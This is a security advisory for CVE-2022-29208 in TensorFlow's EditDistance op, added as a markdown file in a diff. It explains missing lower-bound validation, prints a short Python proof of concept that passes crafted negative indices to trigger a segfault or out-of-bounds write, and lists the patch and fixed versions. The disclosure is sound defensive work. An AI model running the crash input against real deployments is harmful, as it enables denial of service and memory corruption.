@@ -1,0 +1,88 @@
+# [H] Segfault and OOB write due to incomplete validation in `EditDistance` in TensorFlow
+
+## Summary
+Severity: High
+Advisory: GHSA-2r2f-g8mw-9gvr
+CVE: CVE-2022-29208
+CWE: CWE-787
+Ecosystem: PyPI
+CVSS: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H (CVSS_V3)
+Published: 2022-05-24
+Source: https://github.com/advisories/GHSA-2r2f-g8mw-9gvr
+Type: github-advisory
+
+## Affected
+- PyPI: `tensorflow` — affected >=0 <2.6.4
+- PyPI: `tensorflow` — affected >=2.7.0 <2.7.2
+- PyPI: `tensorflow` — affected >=2.8.0 <2.8.1
+- PyPI: `tensorflow-cpu` — affected >=0 <2.6.4
+- PyPI: `tensorflow-cpu` — affected >=2.7.0 <2.7.2
+- PyPI: `tensorflow-cpu` — affected >=2.8.0 <2.8.1
+- PyPI: `tensorflow-gpu` — affected >=0 <2.6.4
+- PyPI: `tensorflow-gpu` — affected >=2.7.0 <2.7.2
+- PyPI: `tensorflow-gpu` — affected >=2.8.0 <2.8.1
+
+## Details
+### Impact
+The implementation of [`tf.raw_ops.EditDistance`]() has incomplete validation. Users can pass negative values to cause a segmentation fault based denial of service:
+
+```python
+import tensorflow as tf
+
+hypothesis_indices = tf.constant(-1250999896764, shape=[3, 3], dtype=tf.int64) 
+hypothesis_values = tf.constant(0, shape=[3], dtype=tf.int64)
+hypothesis_shape = tf.constant(0, shape=[3], dtype=tf.int64)
+
+truth_indices = tf.constant(-1250999896764, shape=[3, 3], dtype=tf.int64)
+truth_values = tf.constant(2, shape=[3], dtype=tf.int64)
+truth_shape = tf.constant(2, shape=[3], dtype=tf.int64) 
+
+tf.raw_ops.EditDistance(
+  hypothesis_indices=hypothesis_indices,
+  hypothesis_values=hypothesis_values,
+  hypothesis_shape=hypothesis_shape,
+  truth_indices=truth_indices,
+  truth_values=truth_values,
+  truth_shape=truth_shape)
+```
+
+In multiple places throughout the code, we are computing an index for a write operation:
+
+```cc
+if (g_truth == g_hypothesis) {
+  auto loc = std::inner_product(g_truth.begin(), g_truth.end(),
+                                output_strides.begin(), int64_t{0});
+  OP_REQUIRES(
+      ctx, loc < output_elements,
+      errors::Internal("Got an inner product ", loc,
+                       " which would require in writing to outside of "
+                       "the buffer for the output tensor (max elements ",
+                       output_elements, ")"));
+  output_t(loc) =
+      gtl::LevenshteinDistance<T>(truth_seq, hypothesis_seq, cmp);
+  // ...
+}
+```
+
+However, the existing validation only checks against the upper bound of the array. Hence, it is possible to write before the array by massaging the input to generate negative values for `loc`.
+
+### Patches
+We have patched the issue in GitHub commit [30721cf564cb029d34535446d6a5a6357bebc8e7](https://github.com/tensorflow/tensorflow/commit/30721cf564cb029d34535446d6a5a6357bebc8e7).
+
+The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.
+
+### For more information
+Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.
+
+### Attribution
+This vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University.
+
+## References
+- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-2r2f-g8mw-9gvr
+- https://nvd.nist.gov/vuln/detail/CVE-2022-29208
+- https://github.com/tensorflow/tensorflow/commit/30721cf564cb029d34535446d6a5a6357bebc8e7
+- https://github.com/tensorflow/tensorflow
+- https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4
+- https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2
+- https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1
+- https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0
